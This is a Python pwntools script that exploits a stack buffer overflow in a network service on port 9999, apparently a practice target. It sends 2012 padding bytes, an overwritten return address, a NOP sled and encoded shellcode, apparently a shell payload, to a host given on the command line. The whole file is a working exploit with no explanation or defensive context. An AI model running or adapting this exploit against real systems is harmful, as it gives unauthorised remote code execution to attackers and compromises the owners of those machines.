#!usr/bin/env/python

from pwn import *
import sys

#offset --> 2012
#bad --> \x00

ip = sys.argv[1]
port = 9999
p = remote(ip,port)

shellcode =  b"\x90"*20
shellcode += b"\xbd\x49\xb6\x3d\xb7\xd9\xf7\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x52\x83\xea\xfc\x31\x6a\x0e"
shellcode += b"\x03\x23\xb8\xdf\x42\x4f\x2c\x9d\xad\xaf\xad"
shellcode += b"\xc2\x24\x4a\x9c\xc2\x53\x1f\x8f\xf2\x10\x4d"
shellcode += b"\x3c\x78\x74\x65\xb7\x0c\x51\x8a\x70\xba\x87"
shellcode += b"\xa5\x81\x97\xf4\xa4\x01\xea\x28\x06\x3b\x25"
shellcode += b"\x3d\x47\x7c\x58\xcc\x15\xd5\x16\x63\x89\x52"
shellcode += b"\x62\xb8\x22\x28\x62\xb8\xd7\xf9\x85\xe9\x46"
shellcode += b"\x71\xdc\x29\x69\x56\x54\x60\x71\xbb\x51\x3a"
shellcode += b"\x0a\x0f\x2d\xbd\xda\x41\xce\x12\x23\x6e\x3d"
shellcode += b"\x6a\x64\x49\xde\x19\x9c\xa9\x63\x1a\x5b\xd3"
shellcode += b"\xbf\xaf\x7f\x73\x4b\x17\x5b\x85\x98\xce\x28"
shellcode += b"\x89\x55\x84\x76\x8e\x68\x49\x0d\xaa\xe1\x6c"
shellcode += b"\xc1\x3a\xb1\x4a\xc5\x67\x61\xf2\x5c\xc2\xc4"
shellcode += b"\x0b\xbe\xad\xb9\xa9\xb5\x40\xad\xc3\x94\x0c"
shellcode += b"\x02\xee\x26\xcd\x0c\x79\x55\xff\x93\xd1\xf1"
shellcode += b"\xb3\x5c\xfc\x06\xb3\x76\xb8\x98\x4a\x79\xb9"
shellcode += b"\xb1\x88\x2d\xe9\xa9\x39\x4e\x62\x29\xc5\x9b"
shellcode += b"\x25\x79\x69\x74\x86\x29\xc9\x24\x6e\x23\xc6"
shellcode += b"\x1b\x8e\x4c\x0c\x34\x25\xb7\xc7\x31\xb1\xb3"
shellcode += b"\xac\x2e\xc7\xbb\xf1\x87\x4e\x5d\x9f\xc7\x06"
shellcode += b"\xf6\x08\x71\x03\x8c\xa9\x7e\x99\xe9\xea\xf5"
shellcode += b"\x2e\x0e\xa4\xfd\x5b\x1c\x51\x0e\x16\x7e\xf4"
shellcode += b"\x11\x8c\x16\x9a\x80\x4b\xe6\xd5\xb8\xc3\xb1"
shellcode += b"\xb2\x0f\x1a\x57\x2f\x29\xb4\x45\xb2\xaf\xff"
shellcode += b"\xcd\x69\x0c\x01\xcc\xfc\x28\x25\xde\x38\xb0"
shellcode += b"\x61\x8a\x94\xe7\x3f\x64\x53\x5e\x8e\xde\x0d"
shellcode += b"\x0d\x58\xb6\xc8\x7d\x5b\xc0\xd4\xab\x2d\x2c"
shellcode += b"\x64\x02\x68\x53\x49\xc2\x7c\x2c\xb7\x72\x82"
shellcode += b"\xe7\x73\x82\xc9\xa5\xd2\x0b\x94\x3c\x67\x56"
shellcode += b"\x27\xeb\xa4\x6f\xa4\x19\x55\x94\xb4\x68\x50"
shellcode += b"\xd0\x72\x81\x28\x49\x17\xa5\x9f\x6a\x32"

size = 3000

buf = b"A"*2012
buf += p32(0x625014df)
buf += shellcode
buf += b"C"*(size-len(buf))

print(p.recvuntil(": "))
p.send("don")
print(p.recvuntil(": "))
p.send(buf)